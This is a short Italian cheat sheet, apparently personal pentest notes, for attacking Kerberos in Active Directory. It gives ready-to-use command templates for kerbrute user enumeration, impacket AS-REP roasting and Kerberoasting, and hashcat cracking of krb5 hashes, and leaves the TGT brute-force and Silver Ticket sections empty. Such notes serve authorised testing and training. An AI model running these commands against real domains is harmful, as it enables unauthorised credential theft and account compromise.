
==Se da errore KRB_AP_ERR_SKEW==
```bash
timedatectl set-ntp false
ntpdate <IP>
```
### **ENUM USER**
==GLI USER POTRESTI ANCHE BRUTEFORZARLI O TROVARLI TRA I METADATA DELLE IMMAGINI SUL SITO==
```bash
kerbrute userenum -d <NOME DOMINIO> --dc <IP DC> <LISTA>
```
![[Pasted image 20230510110607.png]]
### **AspeRoasting**

```bash
impacket-GetNPUsers '<NOME DOMINIO>/' -no-pass -usersfile users.txt -format hashcat -outputfile hash
```
==L'HASH VIENE MESSO NEL FILE DI OUTPUT==
Dopo cracca l'hash
### **Kerberoasting**
```bash
impacket-GetUserSPNs <NOME MACCHINA>/<USER>:<PASS> -request
```
### **TGT BruteForce**

### **CRACK KRB5 HASH**
```bash
hashcat -m 18200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```
### **SILVER TICKET**
